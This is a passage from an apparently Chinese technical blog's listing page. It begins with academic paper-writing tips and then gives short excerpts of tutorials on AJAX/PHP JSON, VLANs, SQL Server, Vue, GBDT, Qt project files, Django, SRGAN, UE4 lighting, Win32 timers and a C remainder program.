11.论文写作流程：第一阶段为初稿：程序-&gt;基础实验-&gt;算法描述-&gt;方案描述-&gt;摘要撰写-&gt;引用撰写；是从细节到总体，初稿只需要把自己的想法准确无误展现出来，特别是保持文字、图示、算法、结果的一致性。第二阶段时修改：按照由易到难的顺序，挑选一部分进行讨论、修改，本阶段还需增加如下内容：相关工作的文献综述，含参考文献；理论基础、符号表；对比试验；消融实验；实验的图形展示。本阶段从总体到细节。第三个阶段时检查与打磨：所有作者进行论文的问题检查、语言打磨。
12.标题要简单明了直入主题，例如文章主要使用哪些核心技术、前沿技术等，这样才能使读者能清晰抓住重点，从而对论文的大致方向的了解。
13.标题要凸显自己论文的核心点，论文题目要有吸引力、易于理解、易于检索、长度最好在40-60个字母之间、尽量不要使用based on，可以用through、with来表示技术。如果主要贡献为算法，题目的缩写应为算法的名称。
14.论文摘要主要是10句话：问题及其严重性、已有工作、已有工作的局限性、本文工作、本文方法的第X个技术/步骤/方面/优势/贡献（这里一般为3个及以上，如没有3个方面，则论文写作量可能会不够）、实验设置、实验结果、提升。
15.关键词是用于检索论文的重要方式之一，关键词常被看作摘要的一种补充，关键词一般由1-3个单词构成，需3-5个关键词。我们写关键词时按第一个字母排序。注意有些期刊规定关键词只能从投稿网站给定的列表选择。
16.引言是对整个事件的完整描述，引言写得漂亮，审稿人就会在后面的正文中找出一些证据，赞扬研究工作有意义、理论完备、实验效果好等等。如果引言写得难看，感觉作者没受过专业的科研训练，他也会在正文中找出几条问题，说论文写得不好。
17.可以把摘要的每一句都扩展成引言中的一段，每段的首句被称为"主题句"，可以把摘要相应那个句子稍作修改移过来。每段应有 5–10 句。期刊论文要求写论文的组织结构。引言的最后一段以 The rest of the paper is organized as follows.
18.每篇论文都应有文献综述，文献综述可以在不同的地方描述，一般在引言中比较简略，在Related work中描述比较详细。文献需要进行分门别类的介绍，不应将参考文献的引用作为句子的主语、宾语等，不要一次性引用超过三篇文献，如： Uncertainty sampling approaches [1,2，3，4，5]，不提倡全局引用，如果实在要引用，应在原句外面套上双引号，否则就是学术不端。最后合理评述相关工作的优缺点，优点即为什么跟随，缺点即论文的动机。说 缺点的时候要注意客气用语。
19.实际上，定义比定理难写，前者要考虑前瞻性；定理比证明难写。理论应该完备，符号要保持同一风格，主要结论为定理theorem，定理前面打辅助的叫作引理 lemma，定理后面的尾巴叫推论 corollary，附属于算法的叫 property。
20.理论证明的逻辑必须是完整的，也就是说要以数学逻辑解释清楚一个事实，理论的充分必要性都要证明清楚。
21.算法伪代码是论文的核心之一。需要说明输入、输出；方法名可写也可不写，但如果被别的方法调用就必须写；主要步骤的注释要写；可使用数学式子或对已有数学式子的引用；不重要的步骤可以省略；伪代码一般控制15-30行。还可能需要进行时间、空间复杂度分析，并写出配套的property以及相应的表格，以使其更标准，
22.论文中的实验部分占比很大，实验数据集越多，覆盖领域越广，结果就越可靠。可以获取自己主要参考文献中的数据 ，有利于进行比较。同一实验结果不应在图和表中同时出现，这样会重复，选择最合适的方式即可。
23.有些实验操作缺乏数据集，解决办法是合成数据或数据采样，这样有助于缓解数据缺乏的问题。
24.实验的主要目的是回答一些作者和读者关心的问题，我们可以采用自问自答的方式，在实验之前提出这些问题，在实验结果列出之后逐个回答（有些审稿人可能会不喜欢这种方式，我们只需要改正即可）。
25.在实验数据部分，与现有算法进行对比时，如果数据太多，用表格就比图合适；如果要把参数影响，数据集大小影响也表现出来，就只有用折线图；最重要的比较放在最后；要有足够的文字进行分析, 不能让读者自己去观察；在分析自己方案优势之余，应分析他的劣势。
26.结论不要太啰嗦，作为论文的最后一部分，通常审稿人和读者都会逐句阅读本部分，一般5 句就够了；避免使用与摘要内相同的句子，这里应该说我们获得哪些观察与结论，结论比摘要更加具体，可以具体到论文中的某个算法，某条性质，某个定理，某个实验结果，这样就自然与摘要区别开来；如果要进一步讨论工作，可列出3至5条。
27.在写参考文献的时候，千万不要直接使用网上的 bibitem，要使用一个正确的模板，然后把文献的内容填进去就可避免大多问题；要将等号进行列对齐；写作者名字时要有意义，必须保证不同的参考文献具有不同的名字；名在前，姓在后；注意题目的大小写，可以用花括号强制设置；会议名如果使用简称，就不要再写全称；除最后一行外，其它行应以逗号结束；为了保证格式的正确性，应检查生成的 pdf 文件，偶尔还会根据投稿期刊的要求来进行 bibitem 的修改。
28.当我们实验效果不好时，我们可以考虑以下几个解决方案：设计替换方案、观察算法所适用数据的特点、使用各种评价指标、调参、输出中间结果。
29.写作论文期间，我们会出现很多低级错误，为了规避这些错误，我们不仅要在写作的时候多注意，写完论文也可以从以下几个方面查找是否存在问题：大小写、空格、引号、数学符号、数学式子涉及的标点符号。
30.要直截了当回复审稿意见，当稿件投到期刊，如果编辑让你修改，多半有戏，修改论文的同时需准备一个point-to-point的回复，注意：思想上务必端正；问题应直接回答；回复不要太长、正文中进行相应的修改才是重点；正文中修改部分应用蓝色字标出。
31.几个常见的审稿意见，文字不规范：单复数和时态不对——&gt;翻译软件，口语化——&gt;多借鉴学术论文中的句子，缺主语——&gt;不要使用祈使句，句子太长难于阅读——&gt;拆分成不超过15个单词的句子；实验不够：对比算法太少——&gt;使用4-8中对比算法，对比的算法太老——&gt;使用近三年的算法进行对比，效果不明显——&gt;重新设计算法；理论不强：数学表达式不正确——&gt;自己再想想，没有算法收敛性分析——&gt;有条件就加，没有算法复杂度分析——&gt;分析不出来就使用实验画曲线来说明；创新不够：动机不强——&gt;写清楚Howeverr, existing approaches … 这句话，创新点不够——&gt;把自己的创新扯成三点。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b592fcffb67fa742a85a31df660edc7c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1fafe0057c449aea9ee8363112bfaadf/" rel="bookmark">
			js如何定义二位数组然后转josn数据，ajax上传给php，php通过json_decode解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 js中先定义数组，注意必须先用[]再用{}，一维和二维的定义不一样
var xuanxiang = []; $(".tkcon").each(function(){ var lsarr={}; lsarr['str1']=$(this).find(".tk_xx").val(); lsarr['str2']=1; xuanxiang[xuanxiang.length]=lsarr; }); 用js转成josn字符串,如果报错就是数组定义有问题
var ls=JSON.stringify(xuanxiang); 通过ajax上传给后台
$.ajax({ url:'ceshi.php?act='+act, type:'post', data:{'xuanxiang':ls}, success:function(res){ layer.msg("保存成功"); },error:function(){ layer.msg("失败"); window.parent.setTimeout(function(){ window.parent.location.reload(); },2000); } }); 用php解析出获取的josn数据
$xuanxiang=json_decode($timuinfo['xuanxiang'],true); for($i=0;$i&lt;count($xuanxiang);$i++){ echo $xuanxiang[$i]['str1']; echo $xuanxiang[$i]['str2']; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/008cc9dbec7350e5c6b628b66215b844/" rel="bookmark">
			诊断测试工具—CANoe.DiVa功能介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、诊断测试现状二、CANoe.DiVa功能介绍总结 前言 在汽车电子经典V模型框架下：
A：V模型左侧由OEM和Supplier共同指定出该项目ECU对应的诊断需求规范；
B：将需求规范释放给Supplier，其基于需求规范做功能实现（代码功能实现）；
C：V模型右侧是集成测试，测试目的是验证ECU功能实现是否是按照需求规范定义内容实现。
对于测试解决方案，传统流程如下：
一、诊断测试现状
在如上图所示，整个流程中：
首先需要工程师基于诊断需求规范提炼出诊断测试规范；
再需要工程师基于测试规范编写测试用例；
最后由测试工程师执行测试用例
在如上整个过程中，有很多的主观性存在：
1、基于需求规范提炼出测试规范时，需要工程师保证：
A：测试逻辑正确、严谨；
B：基于需求做到测试点全覆盖。
2、基于测试规范编写测试用例，需要工程师保证：
A：测试步骤正确无误；
B：测试点全覆盖；
C：具备较强的诊断知识储备，对每个步骤的预期响应了然于胸。
但活于世间，烦心事总伴身边。而心情是影响人逻辑判断正确性很大的因素，因此上述内容有很大的不确定性。
并且对于车载诊断测试实现方法目前有如下三种：
1、全手动测试
业界常用方案是将诊断数据库加载到CANoe中，在诊断控制台“Diagnostic Console”中进行手动测试。
2、半自动化测试（手动编写测试脚本，运行环境自动化运行）
基于PC端运行环境，通过编写测试脚本，实现测试目的。
本文基于业界常用工具CANoe作为运行环境，通过编辑CAPL脚本，实现对车载诊断方面测试。
3、全自动化测试解决方案（自动化生成诊断测试用例，并自动化运行测试用例）
全自动化测试解决方案优势在于大量解决测试成本（时间/金钱），避免参与者的主观性因素，大大提高测试质量。
此处以CANoe.DiVa为例，介绍下全自动化测试解决方案：
二、CANoe.DiVa功能介绍 如下图：
因为每个项目诊断需求规范都不一样，因此需要通过诊断数据库来描述该项目的诊断内容。
通过数据库贯穿整个V模型全流程，有效保证了数据的一致性和有效性。
而对于自动生成测试用例的核心如下：
在CANoe.DiVa中以库的形式已经集成了几万条测试用例，通过识别加载的CDD/ODX数据库中包含的诊断描述内容与库中测试用例Map，有交互点的就对应生成测试用。识别点可以是：
A：Service
B：DID
C：DTC
每一个交汇点对应一个测试用例。
总结 这样就可以实现通过加载诊断数据库，自动生成对应的测试用例。
将生成的测试工程加载到CANoe中，可以自动执行，达到全自动化的解决方案。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a0d7c0cf5bbc6da644af85f5f732769/" rel="bookmark">
			一张图理清access,trunk,hybird,untag,tag在vlan划分的作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vlan：虚拟局域网
pvid是默认vlan ID，（port default vlan ID），用来对收到不带tag的帧打上此vlanID的标签，对于access来说default vlan就是允许通过的vlan，对于trunk来说是唯一的发送时可以去掉标签的vlan，
untag和tag是不带标签和带标签，一般是指发送的时候而言的，access发送时都不带标签，trunk只有发送pvid的帧时去掉标签，hybrid可以手动配置带或不带。
具体运行细节见下图：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d9b252b4271ef875e38b367bfa537e9/" rel="bookmark">
			SQL Server 用 SQL 语句创建表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		创建数据表 sql语句如下
create table 表名 ( 列名 数据类型和字段长度, ...... ) 常用数据类型： char: 定长的非Unicode字符，char(n)
nchar： 定长的Unicode字符，nchar(n)
varchar: 非定长的非Unicode字符，varchar(n)
nvarchar: 非定长的Unicode字符，nvarchar(n)
numeric： 精确数值型，numeric(精确长度，小数位)
decimal： 精确数值型，decimal(精确长度，小数位)
定义数据表的约束 约束是自动强制数据完整性的方式，约束定义了列中允许的取值。
基本语法格式为:
列名 数据类型 约束名 约束类型 约束名： 约束不指定名称时，系统会给定一个名称。
约束类型： 在定义完整性约束是必须指定完整性约束的类型，以下介绍五种完整性类型的完整性约束。
（1）NULL / NOT NULL 约束 当某一字段的值一定要输入值才有意义的时候，则可设置为NOT NULL。当字段允许出现空值时，可设置为 NULL。其语法如下：
constraint &lt;约束名&gt; [NULL | NOT NULL] 例如
建立一个S表，对SNo字段进行 NOT NULL 约束
create table S ( SNo varchar(6) constraint S_CONS NOT NULL ) （2）唯一约束（UNIQUE约束） 唯一约束用于指明基本表在某一列或多个列的组合上的取值必须唯一。唯一键允许为空，但为保证其唯一性，最多只可以出现一个NULL值。其语法如下：
constraint &lt;约束名&gt; unique 在建立唯一约束时，需考虑以下几个因素：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d9b252b4271ef875e38b367bfa537e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2a88e098db21e5fa27ff1e9ca06842e/" rel="bookmark">
			VMware Tools安装后的配置与使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、安装 VMware Tools
2、CentOS会出现一个VMware Tools的安装包，如果没有的话再重新安装一次试试
3、打开这个光驱，可以看到一个VMwareTools...tar.gz的文件，把它拷贝到 /opt目录下
4、打开这个光驱，可以看到一个VMwareTools...tar.gz的文件，把它拷贝到 /opt目录下
5、打开终端输入（其中“...”根据实际修改）
cd /opt tar -zxvf VMwareTools...tar.gz 6、解压后，可以看到 /opt文件夹下，多了一个文件夹
使用终端进入这个目录，以下命令依次执行，如果跟自己的文件名不一样，需要改成自己的
cd vmware-tools-distrib/ ./vmware-install.pl 7、看见这个说明安装成功
8、设置共享
先在Windows创建一个文件夹，用于与Linux共享文件
9、在Linux端查看共享文件
在CentOS中，选择其他位置，再选择计算机，进入mnt文件夹
依次往下点击，可以看到刚刚创建的共享文件夹，也能看到刚刚创建的共享的文件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23dc31189619e2c6cfe5e064d957e251/" rel="bookmark">
			Vue前端基础知识，一文打通
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、什么是Vue
二、MVVM思想
三、快速上手Vue
Vue的声明式渲染
双向绑定 v-text 和 v-html
v-bind v-model v-on
v-for v-if 和 v-show 一、什么是Vue Vue是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上 手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库 结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。
（说白了，vue的出现使得我们的前端开发变得更加简单快捷。懒惰才是第一生产力呀！！！）
二、MVVM思想 M：即Model也就是模型，包括了一些基础的操作V：即视图，也就是页面渲染的结果VM：即View-Model，模型与视图的双向操作 换而言之，框架中MVVM的M就是后端的数据，V就是节点树，VM就是new出来的那个Vue({})对象。
三、快速上手Vue 前面的铺垫已经结束，下面开始Vue的相关操作说明。
Vue的声明式渲染 声明式编程是一种编程范型，与命令式编程相对立。它描述目标性质，让计算机明白目标，而非流程。声明式编程不用告诉电脑问题领域，从而避免随之而来的副作用。而指令式编程专则需要用算法来明确的指出每一步该怎么做。 具体操作也非常的简单：
1、设置一个div标签id为app（id名字随便取一个就行）
&lt;div id="app"&gt; {{ message }} //设置一个message变量，一会说啥意思 &lt;/div&gt; 2、使用Vue声明式渲染这个div标签，并给message赋值
var app = new Vue({ el: '#app', //通过id确定声明式渲染的对象（傻瓜式教学：要绑定哪个就把那个app该成其他的id） data: { message: 'Hello Vue!' //通过这个data给什么的message变量渲染 } }) 其实这一段代码稍微有点了解过Vue的朋友，应该都知道是啥意思。就是Vue通过id绑定了那个div标签，并把message这个变量给渲染了上去。
首先通过 new Vue() 来创建 Vue 实例 ，然后构造函数接收一个对象，对象中有一些属性： el：是 element 的缩写，通过 id 选中要渲染的页面元素，本例中是一个 div data：数据，数据是一个对象，里面有很多属性，都可以渲染到视图中 message：这里我们指定了一个 name 属性 页面中的`h2`元素中，我们通过{{message}}的方式，来渲染刚刚定义的 message属性。 双向绑定 &lt;body&gt; &lt;div id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23dc31189619e2c6cfe5e064d957e251/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba4d5217818d1f14ffb9f67418dcabb5/" rel="bookmark">
			梯度提升树（GBDT）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 概述2. 提升树算法3. 梯度提升树 1. 概述 首先GBDT是集成学习的一种，而且属于boosting家族。我们知道Bagging的思想比较简单，即每一次从原始数据中根据均匀概率分布有放回的抽取和原始数据大小相同的样本集合，样本点可能出现重复，然后对每一次产生的训练集构造一个分类器，再对分类器进行组合。常见的随机森林算法就是bagging的集成算法。
boosting的每一次抽样的样本分布都是不一样的。每一次迭代，都根据上一次迭代的结果，增加被错误分类的样本的权重，使得模型能在之后的迭代中更加注意到难以分类的样本，这是一个不断学习的过程，也是一个不断提升的过程，这也就是boosting思想的本质所在。迭代之后，将每次迭代的基分类器进行集成。那么如何进行样本权重的调整和分类器的集成是我们需要考虑的关键问题。传统的Adaboost，利用前一轮迭代弱学习器的误差率来更新训练集的权重，这样一轮轮的迭代下去。GBDT同样也是一种迭代的方法，使用了前向分布算法，但是弱学习器限定了只能使用CART回归树模型，同时迭代思路和Adaboost也有所不同。
2. 提升树算法 接触过GBDT的想必都听说过残差这个概念，那么什么是残差呢?
假设有一组数据， ( x 1 , y 1 ) , ( x 2 , y 2 ) , … ( x n , y n ) \left(x_1, y_1\right),\left(x_2, y_2\right), \ldots\left(x_n, y_n\right) (x1​,y1​),(x2​,y2​),…(xn​,yn​) ，有一个模型 F ( x ) F(x) F(x) ，用这个模型去拟合 这一批数据，拟合的过程中使得我们选择的损失函数最小，最终成功拟合后，假设得到 F ( x 1 ) = 1.2 ， F ( x 2 ) = 2.5 F\left(x_1\right)=1.2 ， F\left(x_2\right)=2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ba4d5217818d1f14ffb9f67418dcabb5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd4f34a942db1dc9c0261d40c69976d2/" rel="bookmark">
			Qt之pro、pri、prf、prl文件简解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pro文件 QT工程的pro文件，在创建工程时由QTCreater自动创建，我们可以往里面添加内容，增加库文件的声明，包含路径、预处理器定义，生成目录，输出中间目录等等设置。
注释: 以“#”开始，到这一行结束，快捷键：Ctrl+/
CONFIG:指定编译器选项和项目配置，值由qmake内部识别并具有特殊意义
跨平台设置：为防止出错，后面的左大括号要跟着关键字
win32{
}
unix{
}
win32:
unix:
QT：指定项目中使用Qt的模块。默认情况下，QT包含core和gui，以确保标准的GUI应用程序无需进一步的配置就可以构建。
如果想建立一个不包含Qt GUI模块的项目，可以使用“ -=”操作符
TEMPLATE:模板变量告诉qmake为这个应用程序生成哪种makefile:app创建一个用于构建应用程序的Makefile（默认）;lib创建一个用于构建库的Makefile。;subdirs创建一个用于构建目标子目录的Makefile，子目录使用SUBDIRS变量指定。
TARGET:指定目标文件的名称。默认情况下包含的项目文件的基本名称
DESTDIR:指定在何处放置目标文件
TRANSLATIONS:指定包含用户界面翻译文本的翻译(.ts)文件列表
SOURCES:指定项目中的源文件.
HEADERS:指定项目中的头文件.
FORMS:指定UI文件.
INCLUDEPATH:指定编译项目时应该被搜索的#include目录
UI_DIR:指定来自uic的所有中间文件放置的目录（.ui文件转化成ui_*.h文件的存放目录）
MOC_DIR:指定来自moc的所有中间文件放置的目录
RESOURCES:指定资源文件 (qrc) 的名称.
DEFINES:预处理器宏
如果设置 QT_NO_DEBUG_INFO宏后，还想进行输出打印，可用qInfo（）函数。
LIBS:指定链接到项目中的库列表
PWD:.pro或.pri所在路径，注意区分_PRO_FILE_PWD_
OUT_PWD:makefile所在路径，和_PRO_FILE_PWD_对应
PRO_FILE:pro的全路径
PRO_FILE_PWD:pro文件所在路径(注意：即使它在pri文件内，也是指代的包含它的pro所在的路径)
将某一文件复制到指定路径
pri文件 pri文件可以用来添加第三方模块；
pri 包含(include)的首字母。类似于C、C++中的头文件，可以把 *.pro 文件内的一部分内容单独放到一个 *.pri 文件内，然后包含进来
pri文件创建：
pri文件实例：
prf文件 prf文件中的f特性(feature)的首字符。
平常在pro文件中进行 CONFIG += warn_on 等设置时，就会调用对用的prf文件
prf路径：$$QTDIR/mkspecs/features
prl文件 l 这个东西容易理解，链接(link)的首字符。
主要和生成与使用静态库密切相关(动态库也可以有该文件，去Qt安装目录下的lib目录下看看即可)。
生成静态库时，我们需要使用下列配置(进而生成和库文件同名的 *.prl 文件)
CONFIG += create_prl 当工程的模板为app时，会自动添加如下指令(找库文件的时候，会尝试找相应的 *.prl 文件)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd4f34a942db1dc9c0261d40c69976d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13ef7d69b77309fffc3145ae22877490/" rel="bookmark">
			Django全栈实验—仓库管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章背景： 本人为非计算机专业，写这篇文章的目的主要是总结一下我学会的网站简易制作方法，应用的是Django框架，但本文只是简单应用了一下，即使对Django不了解也可以上手，主要利用命令行生成app。对于非专业非科班出身的同学，这种简易制作方法相对友好，但针对专业人员我就不献丑了，不喜勿喷。
创建环境：Python/Pycharm，cmd 这里主要应用的是python的Django库，然后还用到了cmd命令行提示符，其实只用python的IDLE解释器和命令行也能完成，但是在操作方面多有不便，所以建议还是安装一下Pycharm比较好。提前安装好Django库，后续如果有需要额外安装的库，在命令行输入以下命令即可安装。
pip install Django # Django——库名 Django项目——仓储管理系统 1、创建项目框架 利用命令行进行项目框架布局。
1.1 创建项目
进入希望创建项目的文件夹，下图中框起来的地方输入cmd，点击enter进入命令行程序：
输入以下命令：（django_Frame是我的项目名称，可以根据需要输入你要的项目名称）
django-admin startproject django_Frame # 项目名称 # 以上命令创建了文件夹DjangoFrame，且生成文件目录如下：
1.2创建APP
进入项目文件夹，cd Django_Frame，执行如下命令：
python manage.py startapp APP名称（app_login）
此时在该项目中创建了app_login文件，login文件结构如下：
4 注册APP
文件创建好了之后，还需要在 django 中注册该 APP。找到Django_Frame&gt;Django_Frame&gt;settings.py 文件，在该文件中的 INSTALLED_APPS 添加一行，即可注册 APP：
'APP名称.apps.类名',
这行代码的 APP名称 是之前通过命令行创建的 APP名称，apps 是该文件夹中的 apps.py 文件，类名 是该 apps.py 文件中的类名。以我的项目为例，如下：
2、项目内容实现 1 setting.py
完善设置，更改时区(默认数据库为sqlite3)
TIME_ZONE = 'Asia/Shanghai' USE_TZ = False USE_TZ 字段是UTC时间的开关。当USE_TZ = True时,系统采用UTC时间; 当USE_TZ = False时,系统采用要看TIME_ZONE(时区)是否设置。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13ef7d69b77309fffc3145ae22877490/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6924de7cc7f0295f9fb609266832a34/" rel="bookmark">
			图像超分辨率重构实战
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		低分辨率图像重建 任务总览数据加载与配置模型设置生成、判别、特征提取模块调用损失函数与训练测试 今天我们来介绍利用对抗生成网络（GAN）对低分辨率图像进行重构的介绍。再开始今天的任务之前，给大家强调一下，我们需要使用1.x.x版本的tensorflow和tensorlayer，我是用的是3.6版本的python，3.4.1.15版本的opencv以及1.8.0版本的tensorflow和tensorlayer。另外还有其他的一些模块需要安装，直接按照错误提示安装即可。 任务总览 分辨率在图片中的直接反应就是图像的大小，分辨率越高，图像的初始大小越大。如果将不同分辨率的图像放缩到同样的大小，分辨率低的图像会更模糊。超分辨率重构就是将分辨率低的图片重构成清晰的高分辨率图像：
所需要用到的网络结构图为：
数据加载与配置 这个部分对应着生成网络和判别网络的input部分的初始化。
首先需要大家下载srgan任务，打开config文件，我们主要的参数都将在这个文件中进行修改：
from easydict import EasyDict as edict import json config = edict() config.TRAIN = edict() ## Adam # batch设置过大有可能会引发内存不足的报错 config.TRAIN.batch_size = 4 # 可以适当调整 config.TRAIN.lr_init = 1e-4 config.TRAIN.beta1 = 0.9 ## 初始化生成器 config.TRAIN.n_epoch_init = 100 ## 判别器学习 (SRGAN) config.TRAIN.n_epoch = 2000 config.TRAIN.lr_decay = 0.1 config.TRAIN.decay_every = int(config.TRAIN.n_epoch / 2) # 训练集路径指定 config.TRAIN.hr_img_path = 'E:\srgan\srdata\srdata\DIV2K_train_HR' config.TRAIN.lr_img_path = 'E:\srgan\srdata\srdata\DIV2K_train_LR_bicubic\X4' config.VALID = edict() # 测试集路径制定 config.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e6924de7cc7f0295f9fb609266832a34/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6441492c6fd2d0cc064d073e8f767ced/" rel="bookmark">
			硅谷外卖安装axios报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在安装axios时遇到了点坑，
查阅了很多资料最终解决，避免大家多走弯路分享一下
运行项目报错
ERROR Failed to compile with 1 errors 23:20:20 This dependency was not found: * axios in ./src/api/ajax.js To install it, you can run: npm install --save axios 问题： 使用
npm install --save axios 报错
尝试：
1、使用 淘宝镜像
cnpm install axios -- save 可以安装成功，但是，在pages.json文件中会发现，axios并没有安装上。
原因：
cnpm install axios -- save 安装后需要重新启动项目，版本不同有的无需启动！希望对大家有所帮助
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/56fcc50212b45a52b5ac635b5a374128/" rel="bookmark">
			UE4光照基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、光照术语 1. 直接光
直接光指的是光直接落到Actor的表面上，不受其他Actor的干涉。光线从光源直接移动到网格模型的表面。这样的静态网格Actor会接收这个光源的全部颜色光谱。
2. 间接光
间接光指的是有场景中另外的Actor发射来的光。因为光波的被吸收或被反射依赖于表面属性和网格模型的颜色的。反射光会带有一些颜色信息，同时将这些颜色信息传递到路径中的下一个表面上。间接光影响整个环境光的强度。
3. 静态光
静态光指的是用于不会移动的物体和光源的光照。对于不移动的东西，光照和阴影必须只计算一次（在构建时），这样会得到更好的性能和更高的质量。
4. 动态光
动态光指的是在运行时可能移动的光源和物体的光照。因为这样类型的光照每帧都需要计算，它通常比静态光更慢，而且指令也更低。
5. 阴影
阴影是引擎从光源的视点对一个模型的轮廓进行快照，然后将快照得到的图像投射在其他Actor的表面上，在照亮的Actor的反面上。
二、移动性 1. 静态光源
静态光源是在运动时不会以任何方式被改变或移动的光源。光照信息被先于游戏构建，并且存储在一个被称为光照贴图的特殊贴图里面。静态光照给与了高性能，但是不能用于这个光源半径内可移动的物体。使用静态光源的主要原因是为了性能。
2. 可移动光源
可移动光源投射完全动态的光照和阴影，它们可以改变位置、旋转、颜色、亮度、衰减、半径和它们拥有的每一个其他属性。它们的光照不会被烘焙到光照贴面上，它们不能有任何的间接光照、通常这些光源对于渲染来说开销是很大的，并且不会像静态或固定光源一样高质量。
3. 固定光源
固定光源和静态光源一样不可以移动，但是，它们的亮度和颜色可以在运行时被更改。例如，不会移动但可以开关的光源。
三、Swarm Agent 当构建光照时，后台会自动启动一个名叫Swarm Agent的应用程序。Swarm Agent管理者编辑器和Lightmass之间的通信。当构建关照时，Swarm Agent会追踪和显示进度。随着关卡复杂性增加，计算和构建光照所需要的时间也会增加。Swarm Agent也可以被设置为网络上的远程机器通信，利用他们的处理能力来减少计算时间。对于小型项目和关卡不会设计，当需要到网络渲染是很好的。
每次移动一个被设置为投射静态阴影的光源或被设置为静态网格Actor时，编辑器就会提醒你重新构建光照。你拥有的光源和物体越多时，构建关照话费的时间也就越长。当使用光照时，最好遵循迭代过程，仅在做出重大更改时构建光照。你也可以不重新构建光照而直接预览和试玩关卡，但是在你重新构建关照之前，这些光照时不正确的。
aaa
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e34fe111e019bbb3dfe9e76ad0de3ac7/" rel="bookmark">
			windows编程之计时器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相关函数 / 参数 / 类型 SetTimerKillTimerWM_TIMERTIMERPROC SetTimer SetTimer 函数用于创建一个具有指定超时时间的定时器。
API 函数原型： UINT_PTR WINAPI SetTimer( _In_opt_ HWND hWnd, _In_ UINT_PTR nIDEvent, _In_ UINT uElapse, _In_opt_ TIMERPROC lpTimerFunc ); 参数解析：
参数含义hWnd【1】 指定与定时器相关联的窗口的句柄 【2】 该窗口必须属于调用线程 【3】 如果 hWnd 的值为 NULL，同时 nIDEvent 参数指定为一个已经存在的定时器，那么这个定时器将和一个已经存在的非 NULL 的 hWnd 值的定时器一样被替换nIDEvent【1】 非零的定时器标志符 【2】 如果 hWnd 参数为 NULL，并且 nIDEvent 参数不匹配任何已经存在的定时器，那么 nIDEvent 将被忽略，并会产生一个新的定时器 ID 【3】 如果 hWnd 参数不为 NULL，并且 hWnd 指定的窗口已经有一个具有 nIDEvent 值得定时器，则已经存在的定时器将会被新产生的定时器替换 【4】 当 SetTimer 替换一个定时器时，定时器会被重置。因此，在达到当前超时值后一条消息将会被发送，而之前设置的超时值将会被忽略 【5】 如果函数的调用不是用来替换一个已经存在的定时器，那么如果 hWnd 为 NULL，nIDEvent 应该为 0uElapse【1】 以毫秒为单位的超时值 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e34fe111e019bbb3dfe9e76ad0de3ac7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f595e5d292aca595103501cfffe25ff5/" rel="bookmark">
			求一个数的余数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #include &lt;stdio.h&gt;
int main(){
int a,b,x;//定义一个值，一个取余的值，一个余数 printf("请输出一个数：");
scanf("%d",&amp;a);
printf("请输入你要对哪个值取余："); scanf("%d",&amp;b);
x = a % b;
printf("余数=%d",x);
return 0;
} 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
